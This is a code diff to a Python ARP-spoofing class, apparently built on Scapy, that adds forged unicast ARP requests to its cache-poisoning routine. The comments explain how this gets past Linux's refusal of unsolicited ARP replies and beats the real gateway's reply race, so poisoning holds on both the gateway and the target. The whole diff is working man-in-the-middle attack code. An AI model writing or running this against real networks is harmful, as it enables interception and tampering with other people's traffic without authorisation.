@@ -156,6 +156,19 @@ class ArpSpoofer:
     def _poison(self):
         self._send_arp(self.env.gateway_ip, self.our_mac, self.env.target_ip, self.env.target_mac)
         self._send_arp(self.env.target_ip, self.our_mac, self.env.gateway_ip, self.env.gateway_mac)
+        # Unicast ARP requests: Linux targets drop unsolicited replies
+        # (arp_accept=0) and lose the who-has race to the real gateway's
+        # own reply arriving ~1ms later, so a reply-only spoof never
+        # recovers after the target's neighbor entry flips back. A
+        # request is always processed and its sender entry always
+        # cached: ask each side for ITSELF on behalf of the other
+        # (unicast, so bystander caches are untouched).
+        self._send_arp_req(self.env.gateway_ip, self.our_mac, self.env.target_ip, self.env.target_mac)
+        self._send_arp_req(self.env.target_ip, self.our_mac, self.env.gateway_ip, self.env.gateway_mac)
+
+    def _send_arp_req(self, psrc: str, hwsrc: str, pdst: str, hwdst: str):
+        pkt = ARP(op=1, psrc=psrc, hwsrc=hwsrc, pdst=pdst, hwdst=hwdst)
+        sendp(Ether(src=hwsrc, dst=hwdst) / pkt, iface=self.env.iface, verbose=False)
 
     def _send_arp(self, psrc: str, hwsrc: str, pdst: str, hwdst: str, broadcast: bool = False):
         pkt = ARP(op=2, psrc=psrc, hwsrc=hwsrc, pdst=pdst, hwdst=hwdst)
